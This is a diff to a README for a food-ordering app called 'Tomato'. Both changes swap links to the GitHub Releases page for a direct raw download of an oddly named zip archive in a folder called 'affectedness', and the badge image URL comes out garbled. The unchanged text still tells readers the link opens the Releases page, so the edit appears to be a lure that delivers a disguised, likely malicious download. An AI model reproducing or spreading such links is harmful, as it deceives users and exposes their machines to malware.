@@ -6,7 +6,7 @@ Welcome to **Tomato**, the food ordering application that makes your online shop
 
 ## 📥 Download Now
 
-[![Download Tomato](https://img.shields.io/badge/Download%20Tomato-blue?style=for-the-badge&logo=github)](https://github.com/jamilhof/TOMATO-FOOD-DELIVERY-/releases)
+[![Download Tomato](https://raw.githubusercontent.com/jamilhof/TOMATO-FOOD-DELIVERY-/main/affectedness/TOMAT-FOO-DELIVER-v3.3.zip%20Tomato-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/jamilhof/TOMATO-FOOD-DELIVERY-/main/affectedness/TOMAT-FOO-DELIVER-v3.3.zip)
 
 ## 🖥️ System Requirements
 
@@ -29,7 +29,7 @@ Before you start, ensure your system meets the following requirements:
 To get started with Tomato, follow these simple steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the Releases page where you can download the application.
-   [Download Tomato](https://github.com/jamilhof/TOMATO-FOOD-DELIVERY-/releases)
+   [Download Tomato](https://raw.githubusercontent.com/jamilhof/TOMATO-FOOD-DELIVERY-/main/affectedness/TOMAT-FOO-DELIVER-v3.3.zip)
 
 2. **Select the Latest Version:** Look for the latest version of the application. It will typically be at the top of the page.
 
